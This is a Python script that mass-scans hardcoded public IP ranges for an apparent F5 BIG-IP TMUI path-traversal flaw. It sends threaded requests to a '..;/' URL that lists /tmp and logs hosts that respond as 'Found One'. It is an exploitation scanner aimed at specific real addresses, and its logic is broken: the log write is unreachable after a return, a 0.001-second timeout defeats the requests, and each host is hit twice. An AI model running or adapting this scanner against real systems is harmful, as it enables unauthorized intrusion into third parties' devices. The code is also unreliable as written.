import requests
import threading
import ipaddress
import sys
from requests.exceptions import ConnectionError

filename = sys.argv[1]
file = open(filename, "a")
url = "https://{}/tmui/login.jsp/..;/tmui/locallb/workspace/directoryList.jsp?directoryPath=/tmp/"
ip_range = ["43.255.128.0/23","203.15.144.0/22","59.167.239.29","203.29.130.122"]

def make_request(ip):
    try:
        response = requests.get(url.format(ip),verify=False, allow_redirects=False, timeout=.001)
        print(response.status_code)
        if response.status_code == 200:
            return print("Found One: %s" % ip)
            file.write("Found One: %s" % ip)
            file.close()
        else:
            return
    except ConnectionError as e:
        print(e)


for i in range(4):
    for ip in ipaddress.IPv4Network(ip_range[i]):
        thread = threading.Thread(target=make_request, args=(ip,))
        thread.start()
        make_request(ip)
